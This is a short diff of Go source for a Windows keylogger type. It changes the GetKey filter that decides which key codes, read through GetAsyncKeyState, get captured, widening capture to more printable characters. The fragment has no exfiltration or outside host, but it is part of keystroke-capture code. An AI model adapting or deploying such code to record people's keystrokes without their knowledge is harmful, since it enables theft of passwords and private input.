@@ -46,8 +46,8 @@ func (kl *Keylogger) GetKey() Key {
 		keyState = w32.GetAsyncKeyState(i)
 
 		// Check if the key is pressed (if the most significant bit is set)
-		// And check if the key is not a non-char key (except for space and enter, 32,13)
-		if keyState&(1<<15) != 0 && !(i < 47 && i != 32 && i != 13) && (i < 160 || i > 165) && (i < 91 || i > 93) {
+		// And check if the key is not a ASCII control characters (except for enter, 13)
+		if keyState&(1<<15) != 0 && !(i < 32 && i != 13) && (i < 160 || i > 165) {
 			activeKey = i
 			if i == 13 {
 				activeKey = 32
